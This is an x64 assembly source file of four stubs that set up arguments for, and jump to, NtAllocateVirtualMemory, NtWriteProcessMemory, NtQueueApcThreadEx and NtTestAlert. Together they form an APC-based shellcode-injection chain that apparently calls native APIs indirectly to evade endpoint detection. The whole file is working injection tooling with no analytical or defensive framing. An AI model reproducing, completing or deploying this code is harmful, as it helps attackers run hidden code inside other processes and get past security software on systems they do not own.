section .text
    
global IWillBeBack

IWillBeBack:
    mov rbx, rdx                ; Back up
    mov rax, [rbx]              ; NtAllocateVirtualMemory
    mov rcx, [rbx + 0x8]        ; HANDLE ProcessHandle
    mov rdx, [rbx + 0x10]       ; PVOID *BaseAddress
    xor r8, r8                  ; ULONG_PTR ZeroBits
    mov r9, [rbx + 0x18]        ; PSIZE_T RegionSize
    mov r10, [rbx + 0x20]       ; ULONG Protect
    mov [rsp+0x30], r10         ; stack pointer for 6th arg
    mov r10, 0x3000             ; ULONG AllocationType
    mov [rsp+0x28], r10         ; stack pointer for 5th arg
    ;useless ones: 
    ;mov r10, [rbx + 0x38]     ; ULONG CreateFlags
    ;mov [rsp+0x38], r10       ; Place CreateFlags on the stack for the 7th argument
    ;mov r10, [rbx + 0x40]     ; SIZE_T ZeroBits
    ;mov [rsp+0x40], r10       ; Place ZeroBits on the stack for the 8th argument
    ;mov r10, [rbx + 0x48]     ; SIZE_T StackSize
    ;mov [rsp+0x48], r10       ; Place StackSize on the stack for the 9th argument, unfortunately, the argument stack has size 
    jmp rax


global WriteProcessMemoryCustom

WriteProcessMemoryCustom:
    mov rbx, rdx                ; back up 
    mov rax, [rbx]              ; NtWriteProcessMemory
    mov rcx, [rbx + 0x8]        ; HANDLE ProcessHandle
    mov rdx, [rbx + 0x10]       ; PVOID BaseAddress
    mov r8, [rbx + 0x18]                 ; PVOID Buffer
    mov r9, [rbx + 0x20]        ; SIZE_T size
    mov r10, [rbx + 0x28]       ; ULONG  NumberOfBytesWritten OPTIONAL
    mov [rsp+0x28], r10         ; pointer for 5th argument
    jmp rax


global NtQueueApcThreadCustom

NtQueueApcThreadCustom:
    mov rbx, rdx                ; back up 
    mov rax, [rbx]              ; INT_PTR pNtQueueApcThreadEx
    mov rcx, [rbx + 0x8]        ; HANDLE hThread;  
    mov rdx, [rbx + 0x10]       ; HANDLE UserApcReserveHandle;
    mov r8, [rbx + 0x18]                 ; QUEUE_USER_APC_FLAGS QueueUserApcFlags
    mov r9, [rbx + 0x20]        ; PVOID ApcRoutine
    ;mov r10, [rbx + 0x28]       ; PVOID Memory address of ApcRoutine
    ;mov [rsp+0x28], r10         ; pointer for 5th argument
    ;mov r10, [rbx + 0x30]       ; PVOID The size argument for ApcRoutine
    ;mov [rsp+0x30], r10         ; pointer for 6th argument
    ;mov r10, [rbx + 0x38]       ; PVOID The buffer bytes
    ;mov [rsp+0x38], r10         ; pointer for 7th argument
    jmp rax

global NtTestAlertCustom

NtTestAlertCustom:
    mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
    mov rax, [rbx]              ; INT_PTR pNtQueueApcThreadEx
    jmp rax